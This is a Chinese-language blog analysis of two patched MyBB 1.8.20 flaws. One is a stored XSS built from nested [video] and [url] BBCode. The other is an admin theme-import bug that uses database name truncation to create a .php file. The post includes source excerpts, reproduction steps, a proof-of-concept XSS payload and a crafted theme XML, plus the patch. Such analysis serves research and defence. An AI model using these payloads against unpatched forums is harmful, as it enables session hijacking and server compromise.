---
title: Mybb 18.20 From Stored XSS to RCE 分析
date: 2019-06-12 17:48:04
tags:
- xss
- rce
---

2019年6月11日，RIPS团队在团队博客中分享了一篇[MyBB <= 1.8.20: From Stored XSS to RCE](https://blog.ripstech.com/2019/mybb-stored-xss-to-rce/),文章中主要提到了一个Mybb18.20中存在的存储型xss以及一个后台的文件上传绕过。

其实漏洞本身来说，毕竟是需要通过XSS来触发的，哪怕是储存型XSS可以通过私信等方式隐藏，但漏洞的影响再怎么严重也有限，但漏洞点却意外的精巧，下面就让我们一起来详细聊聊看...


<!--more-->

# 漏洞要求

## 储存型xss

- 拥有可以发布信息的账号权限
- 服务端开启视频解析
- <=18.20

## 后台文件创建漏洞

- 拥有后台管理员权限（换言之就是需要有管理员权限的账号触发xss）
- <=18.20



# 漏洞分析

在原文的描述中，把多个漏洞构建成一个利用链来解释，但从漏洞分析的角度来看，我们没必要这么强行，我们分别聊聊这两个单独的漏洞：储存型xss、后台任意文件创建。

## 储存型xss

在Mybb乃至大部分的论坛类CMS中，一般无论是文章还是评论又或是的什么东西，都会需要在内容中插入图片、链接、视频等等等，而其中大部分都是选择使用一套所谓的“伪”标签的解析方式。

也就是说用户们通过在内容中加入`[url]`、`[img]`等“伪”标签，后台就会在保存文章或者解析文章的时候，把这类“伪”标签转化为相应的`<a>`、`<img>`，然后输出到文章内容中，而这种方式会以事先规定好的方式解析和处理内容以及标签，也就是所谓的白名单防御，而这种语法被称之为[bbcode](https://zh.wikipedia.org/wiki/BBCode)。

这样一来攻击者就很难构造储存型xss了，因为除了这些标签以外，其他的标签都不会被解析（所有的左右尖括号以及双引号都会被转义）。

```
function htmlspecialchars_uni($message)
{
	$message = preg_replace("#&(?!\#[0-9]+;)#si", "&amp;", $message); // Fix & but allow unicode
	$message = str_replace("<", "&lt;", $message);
	$message = str_replace(">", "&gt;", $message);
	$message = str_replace("\"", "&quot;", $message);
	return $message;
}
```

正所谓，有人的地方就会有漏洞。

在这看似很绝对的防御方式下，我们不如重新梳理下Mybb中的处理过程。

在`/inc/class_parse.php` line 435 的 `parse_mycode`函数中就是主要负责处理这个问题的地方。

```
	function parse_mycode($message, $options=array())
	{
		global $lang, $mybb;

		if(empty($this->options))
		{
			$this->options = $options;
		}

		// Cache the MyCode globally if needed.
		if($this->mycode_cache == 0)
		{
			$this->cache_mycode();
		}

		// Parse quotes first
		$message = $this->mycode_parse_quotes($message);

		// Convert images when allowed.
		if(!empty($this->options['allow_imgcode']))
		{
			$message = preg_replace_callback("#\[img\](\r\n?|\n?)(https?://([^<>\"']+?))\[/img\]#is", array($this, 'mycode_parse_img_callback1'), $message);
			$message = preg_replace_callback("#\[img=([1-9][0-9]*)x([1-9][0-9]*)\](\r\n?|\n?)(https?://([^<>\"']+?))\[/img\]#is", array($this, 'mycode_parse_img_callback2'), $message);
			$message = preg_replace_callback("#\[img align=(left|right)\](\r\n?|\n?)(https?://([^<>\"']+?))\[/img\]#is", array($this, 'mycode_parse_img_callback3'), $message);
			$message = preg_replace_callback("#\[img=([1-9][0-9]*)x([1-9][0-9]*) align=(left|right)\](\r\n?|\n?)(https?://([^<>\"']+?))\[/img\]#is", array($this, 'mycode_parse_img_callback4'), $message);
		}
		else
		{
			$message = preg_replace_callback("#\[img\](\r\n?|\n?)(https?://([^<>\"']+?))\[/img\]#is", array($this, 'mycode_parse_img_disabled_callback1'), $message);
			$message = preg_replace_callback("#\[img=([1-9][0-9]*)x([1-9][0-9]*)\](\r\n?|\n?)(https?://([^<>\"']+?))\[/img\]#is", array($this, 'mycode_parse_img_disabled_callback2'), $message);
			$message = preg_replace_callback("#\[img align=(left|right)\](\r\n?|\n?)(https?://([^<>\"']+?))\[/img\]#is", array($this, 'mycode_parse_img_disabled_callback3'), $message);
			$message = preg_replace_callback("#\[img=([1-9][0-9]*)x([1-9][0-9]*) align=(left|right)\](\r\n?|\n?)(https?://([^<>\"']+?))\[/img\]#is", array($this, 'mycode_parse_img_disabled_callback4'), $message);
		}

		// Convert videos when allow.
		if(!empty($this->options['allow_videocode']))
		{
			$message = preg_replace_callback("#\[video=(.*?)\](.*?)\[/video\]#i", array($this, 'mycode_parse_video_callback'), $message);
		}
		else
		{
			$message = preg_replace_callback("#\[video=(.*?)\](.*?)\[/video\]#i", array($this, 'mycode_parse_video_disabled_callback'), $message);
		}

		$message = str_replace('$', '&#36;', $message);

		// Replace the rest
		if($this->mycode_cache['standard_count'] > 0)
		{
			$message = preg_replace($this->mycode_cache['standard']['find'], $this->mycode_cache['standard']['replacement'], $message);
		}

		if($this->mycode_cache['callback_count'] > 0)
		{
			foreach($this->mycode_cache['callback'] as $replace)
			{
				$message = preg_replace_callback($replace['find'], $replace['replacement'], $message);
			}
		}

		// Replace the nestable mycode's
		if($this->mycode_cache['nestable_count'] > 0)
		{
			foreach($this->mycode_cache['nestable'] as $mycode)
			{
				while(preg_match($mycode['find'], $message))
				{
					$message = preg_replace($mycode['find'], $mycode['replacement'], $message);
				}
			}
		}

		// Reset list cache
		if($mybb->settings['allowlistmycode'] == 1)
		{
			$this->list_elements = array();
			$this->list_count = 0;

			// Find all lists
			$message = preg_replace_callback("#(\[list(=(a|A|i|I|1))?\]|\[/list\])#si", array($this, 'mycode_prepare_list'), $message);

			// Replace all lists
			for($i = $this->list_count; $i > 0; $i--)
			{
				// Ignores missing end tags
				$message = preg_replace_callback("#\s?\[list(=(a|A|i|I|1))?&{$i}\](.*?)(\[/list&{$i}\]|$)(\r\n?|\n?)#si", array($this, 'mycode_parse_list_callback'), $message, 1);
			}
		}

		$message = $this->mycode_auto_url($message);

		return $message;
	}
```

当服务端接收到你发送的内容时，首先会处理解析`[img]`相关的标签语法，然后如果开启了`$this->options['allow_videocode']`（默认开启），那么开始解析`[video]`相关的语法，然后是`[list]`标签。在488行开始，会对`[url]`等标签做相应的处理。

```
if($this->mycode_cache['callback_count'] > 0)
	{
		foreach($this->mycode_cache['callback'] as $replace)
		{
			$message = preg_replace_callback($replace['find'], $replace['replacement'], $message);
		}
	}
```

我们把上面的流程简单的具象化，假设我们在内容中输入了
```
[video=youtube]youtube.com/test[/video][url]test.com[/url]
```

后台会首先处理`[video]`，然后内容就变成了
```
<iframe src="youtube.com/test">[url]test.com[/url]
```

然后会处理`[url]`标签，最后内容变成
```
<iframe src="youtube.com/test"><a href="test.com"></a>
```

乍一看好像没什么问题，每个标签内容都会被拼接到标签相应的属性内，还会被`htmlspecialchars_uni`处理，也没办法逃逸双引号的包裹。

但假如我们输入这样的内容呢?
```
[video=youtube]http://test/test#[url]onload=alert();//[/url]&amp;1=1[/video]
```

首先跟入到函数`/inc/class_parse.php line 1385行 mycode_parse_video`中

![image.png-197.3kB][1]

链接经过`parse_url`处理被分解为
```
array (size=4)
  'scheme' => string 'http' (length=4)
  'host' => string 'test' (length=4)
  'path' => string '/test' (length=5)
  'fragment' => string '[url]onmousemove=alert();//[/url]&amp;1=1' (length=41)
```

然后在1420行，各个参数会被做相应的处理，由于我们必须保留`=`号以及`/`
号，所以这里我们选择把内容放在fragment中。

![image.png-116.1kB][2]

在1501行case youtube中，被拼接到id上

```
case "youtube":
	if($fragments[0])
	{
		$id = str_replace('!v=', '', $fragments[0]); // http://www.youtube.com/watch#!v=fds123
	}
	elseif($input['v'])
	{
		$id = $input['v']; // http://www.youtube.com/watch?v=fds123
	}
	else
	{
		$id = $path[1]; // http://www.youtu.be/fds123
	}
	break;
```

最后id会经过一次htmlspecialchars_uni，然后生成模板。
```
$id = htmlspecialchars_uni($id);

eval("\$video_code = \"".$templates->get("video_{$video}_embed", 1, 0)."\";");
return $video_code;
```
当然这并不影响到我们上面的内容。

到此为止我们的内容变成了
```
<iframe width="560" height="315" src="//www.youtube.com/embed/[url]onload=alert();//[/url]" frameborder="0" allowfullscreen></iframe>
```

紧接着再经过对`[url]`的处理，上面的内容变为

```
<iframe width="560" height="315" src="//www.youtube.com/embed/<a href="http://onload=alert();//" target="_blank" rel="noopener" class="mycode_url">http://onload=alert();//</a>" frameborder="0" allowfullscreen></iframe>
```

我们再把前面的内容简化看看，链接由
```
[video=youtube]http://test/test#[url]onload=alert();//[/url]&amp;1=1[/video]
```
变成了
```
<iframe src="//www.youtube.com/embed/<a href="http://onload=alert();//"..."></iframe>
```

由于我们插入在`iframe`标签中的href被转变成了`<a href="http://onload=alert();//">`, 由于双引号没有转义，所以iframe的href在a标签的href中被闭合，而原本的a标签中的href内容被直接暴露在了标签中，onload就变成了有效的属性！

最后浏览器会做简单的解析分割处理，最后生成了相应的标签，当url中的链接加载完毕，标签的动作属性就可以被触发了。

![image.png-118kB][3]

## 管理员后台文件创建漏洞

在Mybb的管理员后台中，管理员可以自定义论坛的模板和主题，除了普通的导入主题以外，他们允许管理员直接创建新的css文件，当然，服务端限制了管理员的这种行为，它要求管理员只能创建文件结尾为`.css`的文件。

```
/admin/inc/functions_themes.php line 264

function import_theme_xml($xml, $options=array())
{
    ...
	foreach($theme['stylesheets']['stylesheet'] as $stylesheet)
    {
    	if(substr($stylesheet['attributes']['name'], -4) != ".css")
    	{
    		continue;
    	}
    	...

```

看上去好像并没有什么办法绕过，但值得注意的是，代码中先将文件名先写入了数据库中。

![image.png-209.7kB][4]

紧接着我们看看数据库结构

![image.png-127.8kB][5]

我们可以很明显的看到name的类型为varchar且长度只有30位。

如果我们在上传的xml文件中构造name为`tttttttttttttttttttttttttt.php.css`时，name在存入数据库时会被截断，并只保留前30位，也就是`tttttttttttttttttttttttttt.php`.

```
<?xml version="1.0" encoding="UTF-8"?>

<theme>
    <stylesheets>
        <stylesheet name="tttttttttttttttttttttttttt.php.css">
        	test
    	</stylesheet>
    </stylesheets>
    
</theme>
```

紧接着我们需要寻找一个获取name并创建文件的地方。

在/admin/modules/style/themes.php 的1252行，这个变量被从数据库中提取出来。

![image.png-150kB][6]

theme_stylesheet 的name作为字典的键被写入相关的数据。

当`$mybb->input['do'] == "save_orders"`时，当前主题会被修改。

![image.png-460.7kB][7]

在保存了当前主题之后，后台会检查每个文件是否存在，如果不存在，则会获取name并写入相应的内容。

![image.png-50.8kB][8]

可以看到我们成功的写入了php文件

# 完成的漏洞复现过程

## 储存型xss

找到任意一个发送信息的地方，如发表文章、发送私信等....


![image.png-49.9kB][9]

发送下面这些信息
```
[video=youtube]http://test/test#[url]onload=alert();//[/url]&amp;amp;1=1[/video]


```
然后阅读就可以触发

![image.png-53.1kB][10]

## 后台文件创建漏洞

找到后台加载theme的地方

![image.png-64.8kB][11]

构造上传文件test.xml
```
<?xml version="1.0" encoding="UTF-8"?>

<theme>
    <stylesheets>
        <stylesheet name="tttttttttttttttttttttttttt.php.css">
        	test
    	</stylesheet>
    </stylesheets>
    
</theme>
```

需要注意要勾选 Ignore Version Compatibility。

然后查看Theme列表，找到新添加的theme

![image.png-104kB][12]

然后保存并访问相应tid地址的文件即可

![image.png-50.8kB][13]

# 补丁

- [https://github.com/mybb/mybb/commit/44fc01f723b122be1bc8daaca324e29b690901d6](https://github.com/mybb/mybb/commit/44fc01f723b122be1bc8daaca324e29b690901d6)

## 储存型xss

![image.png-28.6kB][14]

这里的iframe标签的链接被encode_url重新处理，一旦被转义，那么`[url]`就不会被继续解析，则不会存在问题。

## 后台任意文件创建

![image.png-64kB][15]

在判断文件名后缀之前，加入了字符数的截断，这样一来就无法通过数据库字符截断来构造特殊的name了。

# 写在最后

整个漏洞其实说到实际利用来说，其实不算太苛刻，基本上来说只要能注册这个论坛的账号就可以构造xss，由于是储存型xss，所以无论是发送私信还是广而告之都有很大的概率被管理员点击，当管理员触发之后，之后的js构造exp就只是代码复杂度的问题了。

抛开实际的利用不谈，这个漏洞的普适性才更加的特殊，bbcode是现在主流的论坛复杂环境的解决方案，事实上，可能会有不少cms会忽略和mybb一样的问题，毕竟人才是最大的安全问题，当人自以为是理解了机器的一切想法时，就会理所当然得忽略那些还没被发掘的问题，安全问题，也就在这种情况下悄然诞生了...


  [1]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/2sqg4mfyp2gxvzkgso6ukbpf/image.png
  [2]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/2djx25qc7zk91sre0cb57qpa/image.png
  [3]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/1vzl0syw0azoyze1eyjswdj6/image.png
  [4]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/x21og8j9jusptv8jydinfwsi/image.png
  [5]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/dmab7neitnrhhc9tz6vsg5kp/image.png
  [6]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/6hb80yi92z4d8qw6jr84ddr8/image.png
  [7]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/9ymykvc2nkw2iyrrcglu6mbj/image.png
  [8]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/534dh1kbms7bj74nd9kj1gsv/image.png
  [9]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/kbvn6wytobvzdkdxsf7kt1g3/image.png
  [10]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/hg8teug35kvvqidni2yp3wwl/image.png
  [11]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/92kjt8109dfzko2q6w7dwxh9/image.png
  [12]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/b20kmnra0fwqj0jmd5evy1d1/image.png
  [13]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/534dh1kbms7bj74nd9kj1gsv/image.png
  [14]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/6ulzp7tspenjxkw6736kp67y/image.png
  [15]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/02hprp4c9vbokdj0p3lczilz/image.png
